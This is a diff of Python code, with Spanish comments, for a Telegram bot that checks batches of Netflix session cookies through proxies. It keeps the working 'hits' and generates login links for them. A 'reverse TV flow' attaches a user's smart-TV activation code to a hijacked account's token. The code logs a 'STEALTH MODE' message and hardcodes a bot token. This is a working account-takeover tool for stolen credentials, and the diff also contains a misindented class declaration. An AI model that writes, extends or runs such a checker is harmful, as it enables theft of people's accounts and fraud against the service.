@@ -354,14 +354,15 @@ class NetflixChecker:
                 except: pass
         return results
 
+        class NetflixCheckerBot:
     def __init__(self, token, proxy_file="proxies.txt"):
         self.token = token
         
-        # Crear aplicación con timeouts configurados
+        # Crear aplicación con timeouts configurados para evitar TimedOut
         builder = Application.builder().token(token)
         self.app = builder.build()
         
-        # Evitar TimedOut en peticiones a Telegram y Netflix
+        # Configurar tiempos de espera
         self.app.bot.request.connect_timeout = 10
         self.app.bot.request.read_timeout = 20
         self.app.bot.request.write_timeout = 10
@@ -381,29 +382,6 @@ class NetflixChecker:
         self.app.add_handler(CommandHandler("help", self.help_command))
         self.app.add_handler(CommandHandler("stats", self.stats_command))
         self.app.add_handler(CommandHandler("logs", self.logs_command))
-        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
-        self.app.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
-
-        # Cargar proxies si existe el archivo
-        proxy_list = []
-        if os.path.exists(proxy_file):
-            with open(proxy_file, 'r') as f:
-                proxy_list = [line.strip() for line in f if line.strip()]
-        
-        # ... (el resto del código sigue igual)
-        
-        self.checker = NetflixChecker(threads=5, proxy_list=proxy_list, timeout=20)
-        self.user_sessions = {}
-        self.tv_codes_pending = {} # Almacena qué usuario está esperando código de TV
-
-        # Handlers
-        self.app.add_handler(CommandHandler("start", self.start_command))
-        self.app.add_handler(CommandHandler("help", self.help_command))
-        self.app.add_handler(CommandHandler("stats", self.stats_command))
-        self.app.add_handler(CommandHandler("logs", self.logs_command))
-        # No usamos /done ni /cancel como comandos visibles, solo lógica interna
-        
-        # Handler para mensajes de texto (incluyendo códigos de TV)
         self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
         self.app.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
 
@@ -479,18 +457,14 @@ class NetflixChecker:
         # 1. Manejo del Flujo Invertido TV
         if user_id in self.tv_codes_pending:
             code = self.tv_codes_pending[user_id]
-            # Limpiar estado
             del self.tv_codes_pending[user_id]
-            
-            # Buscar la cookie hit más reciente o la última verificada
-            # Nota: En un sistema real, guardaríamos la cookie específica asociada al ID de usuario
-            # Aquí usaremos la última cookie que el usuario envió exitosamente o la última hit
+
             if self.checker.hits:
                 last_hit = self.checker.hits[-1]
                 if last_hit.get('nftoken'):
                     tok_safe = urllib.parse.quote(last_hit['nftoken'], safe="")
                     tv_url = f"https://www.netflix.com/activate?code={code}&lang=en"
-                    
+
                     caption = (
                         f"<b>📺 FLUJO INVERTIDO ACTIVADO</b>\n\n"
                         f"Tu código <b>{code}</b> ha sido vinculado.\n\n"
@@ -544,10 +518,9 @@ class NetflixChecker:
                 return
 
             await update.message.reply_text("📂 Descomprimiendo...")
-            
+
             if user_id not in self.user_sessions: self.user_sessions[user_id] = []
 
-            # Dividir por líneas y filtrar vacías
             lines = [line.strip() for line in text_content.split('\n') if line.strip()]
             self.user_sessions[user_id].extend(lines)
 
@@ -558,7 +531,7 @@ class NetflixChecker:
             text_content = (await file_obj.download_as_bytearray()).decode('utf-8', errors='ignore')
 
             await update.message.reply_text("📄 Leyendo TXT...")
-            
+
             if user_id not in self.user_sessions: self.user_sessions[user_id] = []
 
             lines = [line.strip() for line in text_content.split('\n') if line.strip()]
@@ -609,9 +582,7 @@ class NetflixChecker:
             row1.append(InlineKeyboardButton("📱 Móvil", url=acc["login_phone"]))
         if row1: buttons.append(row1)
 
-        # Botón TV Especial que inicia el flujo invertido
         if acc.get("login_tv") and acc["login_tv"] != "N/A":
-            # Usamos callback_data para activar el modo TV
             buttons.append([InlineKeyboardButton("📺 Activar TV (Inverso)", callback_data=f'tv_{acc.get("nftoken", "")}')])
         else:
             buttons.append([InlineKeyboardButton("📺 TV", url="https://www.netflix.com/tv2")])
@@ -623,25 +594,21 @@ class NetflixChecker:
 
         await update.message.reply_text(caption, parse_mode="HTML", reply_markup=markup)
 
-    # Handler para los botones (TV, etc)
     async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         query = update.callback_query
         await query.answer()
         user_id = query.from_user.id
-        
+
         if query.data.startswith('tv_'):
-            # Entrar en modo espera de código
             self.tv_codes_pending[user_id] = True
             await query.edit_message_text("📺 Ingresa el código único de tu Smart TV (ej: 6578-6534):")
         else:
-            # Otros botones podrían manejarse aquí
             pass
 
     def run(self):
         logger.info(f"Bot iniciado - Dev: {DEVELOPER} - STEALTH MODE")
-        #self.app.add_handler(MessageHandler(filters.CANCEL, self.cancel_command))
         self.app.add_handler(CommandHandler("cancel", self.cancel_command))
-        self.app.add_handler(MessageHandler(filters.Regex('^/done$'), self.done_command)) # Opcional si quieres mantener /done oculto pero funcional
+        self.app.add_handler(MessageHandler(filters.Regex('^/done$'), self.done_command))
         self.app.add_handler(CallbackQueryHandler(self.button_handler))
         self.app.run_polling()
 
@@ -652,7 +619,6 @@ class NetflixChecker:
             await update.message.reply_text(f"🔄 Procesando {len(cookies_list)} cookies...")
             results = self.checker.process_batch(cookies_list)
 
-            # Guardar malas
             self.checker.save_bad_cookies()
 
             if results:
@@ -665,7 +631,8 @@ class NetflixChecker:
         else:
             await update.message.reply_text("ℹ️ Cola vacía.")
 
+
 if __name__ == "__main__":
-    print("Llegué hasta aquí")
-bot = NetflixCheckerBot("9224399752:AAE_iv908Ox4dO77MUdX84vVqXZmG0zPptw")
-bot.run()
+    bot = NetflixCheckerBot("9224399752:AAE_iv908Ox4dO77MUdX84vVqXZmG0zPptw")
+    bot.run()
+            
